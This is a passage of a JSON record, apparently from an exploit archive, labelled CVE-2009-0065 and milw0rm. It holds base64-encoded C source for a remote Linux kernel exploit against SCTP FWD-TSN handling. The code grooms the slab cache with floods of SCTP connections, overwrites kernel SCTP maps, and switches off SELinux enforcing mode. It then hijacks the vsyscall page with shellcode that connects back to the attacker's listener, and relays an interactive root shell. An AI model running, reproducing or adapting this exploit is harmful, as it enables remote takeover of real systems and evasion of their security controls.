MgPSAzOw0KICB0LnR2X3VzZWMgPSAwOw0KICBfX21zZygiWyoqXSBXYWl0aW5nIGRhZW1vbnMgZXhlY3V0aW5nIGdldHRpbWVvZmRheSgpLi4gdGhpcyBjYW4gdGFrZSB1cCB0byBvbmUgbWludXRlLi4uXG4iKTsNCiAgX19tc2coIlsqKl0gLi4iKTsNCiAgZmZsdXNoKHN0ZG91dCk7DQoNCiAgd2hpbGUoc2VsZWN0KGxpc3RlbmZkKzEsICZyLCBOVUxMLCBOVUxMLCAmdCkgPT0gMCkNCiAgew0KICAgIHByaW50ZigiLi4iKTsNCiAgICBmZmx1c2goc3Rkb3V0KTsNCiAgICB0LnR2X3NlYyA9IDM7DQogICAgdC50dl91c2VjID0gMDsNCiAgICBGRF9aRVJPKCZyKTsNCiAgICBGRF9TRVQobGlzdGVuZmQsICZyKTsNCiAgfQ0KICBfX21zZygiLi5cbiIpOw0KDQogIG5ld19mZCA9IGFjY2VwdChsaXN0ZW5mZCwgTlVMTCwgMCk7DQogIGlmKG5ld19mZCA8IDApDQogICAgX19mYXRhbF9wZXJyb3IoImFjY2VwdDogbGlzdGVuIGZkIik7DQogDQoNCiAgX19tc2coIlsqKl0gQ29ubmVjdGVkIVxuIik7IA0KICBwYXRjaGp1bXAoKTsgDQoNCiAgY2xvc2UobGlzdGVuZmQpOw0KICANCiAgd3JpdGUobmV3X2ZkLCAiaWRcbiIsIDMpOw0KDQogIEZEX1pFUk8oJnIpOw0KICBGRF9TRVQobmV3X2ZkLCAmcik7DQogIEZEX1NFVCgwLCAmcik7DQogIHdoaWxlKHNlbGVjdChuZXdfZmQrMSwgJnIsIE5VTEwsIE5VTEwsIE5VTEwpID4gMCkNCiAgew0KICAgIGlmKEZEX0lTU0VUKDAsICZyKSkgLy8gcmVhZCBmcm9tIHN0ZGluDQogICAgew0KICAgICAgcmV0ID0gcmVhZCgwLCBidWZmZXIsIHNpemVvZihidWZmZXIpKTsgDQogICAgICBpZihyZXQgPCAwKQ0KICAgICAgICBfX2ZhdGFsX3BlcnJvcigicmVhZDogZnJvbSBzdGRpbiIpOw0KICAgICAgZWxzZSANCiAgICAgICAgcmV0ID0gd3JpdGUobmV3X2ZkLCBidWZmZXIsIHJldCk7DQogICAgfQ0KDQogICAgaWYoRkRfSVNTRVQobmV3X2ZkLCAmcikpDQogICAgew0KICAgICAgcmV0ID0gcmVhZChuZXdfZmQsIGJ1ZmZlciwgc2l6ZW9mKGJ1ZmZlcikpOw0KICAgICAgaWYoIXJldCkgew0KICAgICAgICBfX21zZygiRW5kb3BvaW50IGNsb3NlZCB0aGUgY29ubmVjdGlvblxuIik7DQogICAgICAgIGJyZWFrOw0KICAgICAgfQ0KICAgICAgZWxzZSBpZihyZXQgPiAwKQ0KICAgICAgew0KICAgICAgICB3cml0ZSgxLCBidWZmZXIsIHJldCk7IA0KICAgICAgfQ0KICAgICAgZWxzZSANCiAgICAgICAgX19mYXRhbF9wZXJyb3IoInJlYWQ6IGZyb20gbmV0Iik7DQogICAgfQ0KDQogICAgRkRfWkVSTygmcik7DQogICAgRkRfU0VUKG5ld19mZCwgJnIpOw0KICAgIEZEX1NFVCgwLCAmcik7DQogIH0NCiAgDQp9DQoNCg0KLyogbmVlZGVkIHdoZW4gZXhwbG9pdGluZyBvbGQgU0xBQiAqLw0Kdm9pZCBzd2FwX3RvX1NMQUJfY2h1bmsoKQ0Kew0KICBfX3UzMiB0bXA7ICANCiAgX191MTYgdG1wMTY7DQoNCiAgdG1wID0gIHRzbjsNCiAgdHNuID0gdHNuMjsNCiAgdHNuMiA9IHRtcDsNCg0KICB0bXAgPSB2dGFnOw0KICB2dGFnID0gdnRhZzI7DQogIHZ0YWcyID0gdG1wOw0KDQogIHRtcDE2ID0gc3BvcnQ7DQogIHNwb3J0ID0gc3BvcnQyOw0KICBzcG9ydDIgPSB0bXAxNjsNCn0NCg0KDQoNCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikNCnsNCg0KICBpbnQgcmV0LCBmZCwgaSwgbGlzdGVuZmQsbz0xOw0KICBzdHJ1Y3Qgc29ja2FkZHJfaW4gbDsNCiAgX191MzIgbGg7DQogIF9fdTE2IGxwOw0KDQogIHNjdHBfZ2V0b3B0KGFyZ2MsIGFyZ3YpOw0KDQogIGxpc3RlbmZkID0gc29ja2V0KFBGX0lORVQsIFNPQ0tfU1RSRUFNLCBJUFBST1RPX1RDUCk7DQogIGlmKHNldHNvY2tvcHQobGlzdGVuZmQsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgKGNoYXIgKikmbywgc2l6ZW9mKG8pKSA8IDApDQogICBfX2ZhdGFsX3BlcnJvcigic2V0c29ja29wdDogU09fUkVVU0VBRERSIik7DQogIA0KICBsLnNpbl9mYW1pbHkgPSBQRl9JTkVUOw0KICBsLnNpbl9wb3J0ID0gaHRvbnMoaC5scG9ydCk7IA0KICBsLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihoLmxob3N0KTsNCiAgaWYoYmluZChsaXN0ZW5mZCwgKHN0cnVjdCBzb2NrYWRkciAqKSZsLCBzaXplb2YobCkpIDwgMCkNCiAgICBfX2ZhdGFsX3BlcnJvcigiYmluZDogc29jayIpOw0KICANCiAgaWYobGlzdGVuKGxpc3RlbmZkLCA0KSA8IDApDQogICAgX19mYXRhbF9wZXJyb3IoImxpc3Rlbjogc29jayIpOw0KICANCg0KICAvKiBzZXQgY29ubmVjdCBiYWNrIHBhcmFtcyAqLw0KICBsaCA9IGluZXRfYWRkcihoLmxob3N0KTsNCiAgbHAgPSBodG9ucyhoLmxwb3J0KTsNCiAgbWVtY3B5KGstPnNjb2RlICsgay0+cG9ydG9mZiwgJmxwLCAyKTsNCiAgbWVtY3B5KGstPnNjb2RlICsgay0+aG9zdG9mZiwgJmxoLCA0KTsNCg0KICByYXdfc2N0cCA9IHNvY2tldChQRl9JTkVULCBTT0NLX1JBVywgSVBQUk9UT19TQ1RQKTsNCiAgaWYocmF3X3NjdHAgPCAwKQ0KICAgIF9fZmF0YWxfcGVycm9yKCJzb2NrZXQ6IFJBVy9TQ1RQIG1vbnRpdG9yIHNvY2tldCIpOw0KICANCiAgc2VydmVyX3NjdHAuc2luX2ZhbWlseSA9IFBGX0lORVQ7DQogIHNlcnZlcl9zY3RwLnNpbl9wb3J0ID0gaHRvbnMoaC5ycG9ydCk7IA0KICBzZXJ2ZXJfc2N0cC5zaW5fYWRkci5zX2FkZHIgPSBpbmV0X2FkZHIoaC5yaG9zdCk7DQoNCiAgX19tc2coIlsqKl0gTW9uaXRvcmluZyBOZXR3b3JrIGZvciBUU04vVlRBRyBwYWlycy4uIFxuIik7DQogIHJldCA9IGNsb25lKGNsb25lX3RocmVhZCwgY2xvbmVfc3RhY2srU1RBQ0tfU0laRS04LCBDTE9ORV9WTXxTSUdDSExELCBOVUxMKTsNCiAgaWYocmV0IDwgMCkNCiAgICBfX2ZhdGFsX3BlcnJvcigiY2xvbmUiKTsNCiAgDQogIHNsZWVwKDEpOw0KDQogIF9fbXNnKCJbKipdIFN0YXJ0IGZsdXNoaW5nIHNsdWIgY2FjaGUuLi5cbiIpOw0KICBmb3IoaT0wOyBpPD1oLm5jb25uOyBpKyspDQogIHsNCiAgICBfX3UxNiBwID0gc3BvcnQtKGgubmNvbm4tMSkraTsNCiAgICBpZihwID09IHNwb3J0IHx8IHA9PSBzcG9ydDIpDQogICAgICBmZCA9IG1ha2Vfc2N0cF9jb25uZWN0aW9uKHAsIGgucnBvcnQsIDEpOw0KICAgIGVsc2UgDQogICAgICBmZCA9IG1ha2Vfc2N0cF9jb25uZWN0aW9uKHNwb3J0LShoLm5jb25uLTEpK2ksIGgucnBvcnQsIDApOw0KLy8gICAgdXNsZWVwKDEwKTsNCiAgfSANCg0KDQogIGRpc2FibGVfYWJvcnQoKTsgDQogIC8qIHdhaXQgZm9yIG1vbml0b3JpbmcgZW5naW5lICovIA0KICB3YWl0KE5VTEwpOw0KDQogIGlmKGstPmFsbG9jYXRvcl90eXBlID09IFNMQUJfQUxMT0NBVE9SKQ0KICAgIHN3YXBfdG9fU0xBQl9jaHVuaygpOw0KIA0KICBpZih2dGFnICYmIHRzbiAmJiB2dGFnMiAmJiB0c24yKSAgIA0KICB7DQogICAgX191MzIgYWNjOw0KICAgIA0KICAgIF9fbXNnX2YoIlsqKl0gVXNpbmcgVFNOL1ZUQUcgcGFpcnM6IChUU046ICV4IDw9PiBWVEFHOiAleCkgLyAoVFNOOiAleCA8PT4gVlRBRzogJXgpLi4uXG4iLCB0c24sIHZ0YWcsIHRzbjIsIHZ0YWcyKTsNCiAgICBzbGVlcCgxKTsNCg0KICAgIGlmKGstPnNlbGludXgpDQogICAgew0KICAgICAgX19tc2coIlsqKl0gT3ZlcndyaXRpbmcgbmVpZ2h0Ym9hcmQgc2N0cCBtYXAuLlxuIik7DQogICAgICBhY2MgPSAoay0+c2x1YnNpemUgLSBrLT5jaHVua3NpemUpIC8gMjsNCiAgICAgIHJldCA9IGJ1aWxkX3N0cmVhbShrLT5zZWxpbnV4LCBrLT5wdHJzaXplLCBhY2MpOyANCiAgICAgIGlmKHJldCA8IDApDQogICAgICAgIF9fZmF0YWwoIkVycm9yIEJ1aWxkaW5nIFN0cmVhbXMuLi4iKTsNCiAgICANCiAgICAgIGh0b25zX3N0cmVhbXMoc3RyZWFtcywgcmV0KTsNCiAgICAgIHNlbmRfZndkX2NodW5rKHNwb3J0LCBoLnJwb3J0LCBzdHJlYW1zLCByZXQsIHZ0YWcsIHRzbik7IA0KDQogICAgICBfX21zZygiWyoqXSBEaXNhYmxpbmcgU2VsaW51eCBFbmZvcmNpbmcgTW9kZS4uXG4iKTsNCiAgICAgIHJldCA9IGJ1aWxkX3N0cmVhbShfX3plcm8sIDQsIDApOw0KICAgICAgaWYocmV0IDwgMCkNCiAgICAgICAgX19mYXRhbCgiRXJyb3IgQnVpbGRpbmcgU3RyZWFtcy4uLiIpOw0KDQogICAgICBodG9uc19zdHJlYW1zKHN0cmVhbXMsIHJldCk7DQogICAgICBzZW5kX2Z3ZF9jaHVuayhzcG9ydDIsIGgucnBvcnQsIHN0cmVhbXMsIHJldCwgdnRhZzIsIHRzbjIpOyANCiAgICB9DQoNCiAgICBfX21zZygiWyoqXSBPdmVyd3JpdGluZyBuZWlnaHRib2FyZCBzY3RwIG1hcCAuLi4uLi5cbiIpOw0KICAgIGFjYyA9IChrLT5zbHVic2l6ZSAtIGstPmNodW5rc2l6ZSkgLyAyOw0KICAgIHJldCA9IGJ1aWxkX3N0cmVhbShrLT52c3lzYWRkciwgay0+cHRyc2l6ZSwgYWNjKTsgDQogICAgaWYocmV0IDwgMCkNCiAgICAgIF9fZmF0YWwoIkVycm9yIEJ1aWxkaW5nIFN0cmVhbXMuLi4iKTsNCg0KICAgIGh0b25zX3N0cmVhbXMoc3RyZWFtcywgcmV0KTsNCiAgICBzZW5kX2Z3ZF9jaHVuayhzcG9ydCwgaC5ycG9ydCwgc3RyZWFtcywgcmV0LCB2dGFnLCB0c24pOyANCg0KICAgIF9fbXNnKCJbKipdIE92ZXJ3cml0aW5nIHZzeXNjYWxsIHNoYWRvdyBtYXAuLlxuIik7DQogICAgYWNjID0gMHg5MzAgLyAyOw0KICAgIHJldCA9IGJ1aWxkX3N0cmVhbShrLT5zY29kZSwgay0+c2NvZGVzaXplLCBhY2MpOyAvLzExNzYgDQogICAgaWYocmV0IDwgMCkNCiAgICAgIF9fZmF0YWwoIkVycm9yIEJ1aWxkaW5nIFN0cmVhbXMuLi4iKTsNCg0KICAgIGh0b25zX3N0cmVhbXMoc3RyZWFtcywgcmV0KTsNCiAgICBzZW5kX2Z3ZF9jaHVuayhzcG9ydDIsIGgucnBvcnQsIHN0cmVhbXMsIHJldCwgdnRhZzIsIHRzbjIpOyANCiAgICAgDQogICAgX19tc2coIlsqKl0gSGlqYWNraW5nIHZzeXNjYWxsIHNoYWRvdyBtYXAuLlxuIik7DQogICAgcmV0ID0gYnVpbGRfc3RyZWFtKGstPnZzeXNqdW1wLCBrLT52c3lzanVtcHNpemUsIDApOyANCiAgICBpZihyZXQgPCAwKQ0KICAgICAgX19mYXRhbCgiRXJyb3IgQnVpbGRpbmcgU3RyZWFtcy4uLiIpOw0KDQogICAgaHRvbnNfc3RyZWFtcyhzdHJlYW1zLCByZXQpOw0KICAgIHNlbmRfZndkX2NodW5rKHNwb3J0MiwgaC5ycG9ydCwgc3RyZWFtcywgcmV0LCB2dGFnMiwgdHNuMik7IA0KDQogICAgc2xlZXAoMSk7IA0KICB9DQogIGVsc2UNCiAgICBfX2ZhdGFsKCJWVEFHL1RTTiBub3QgZm91bmQ6IG5ldHdvcmsgZXJyb3IiKTsNCg0KDQogIG11bHRpcGxleChsaXN0ZW5mZCk7IA0KICBfX21zZygiWyoqXSBDbG9zaW5nIENvbm5lY3Rpb24uLi4gXG4iKTsNCiAgcmV0dXJuIDA7DQp9DQoNCi8vIG1pbHcwcm0uY29tIFsyMDA5LTA0LTI4XQ==", 
    "id": "8556", 
    "cves": [
        "CVE-2009-0065"
    ]
}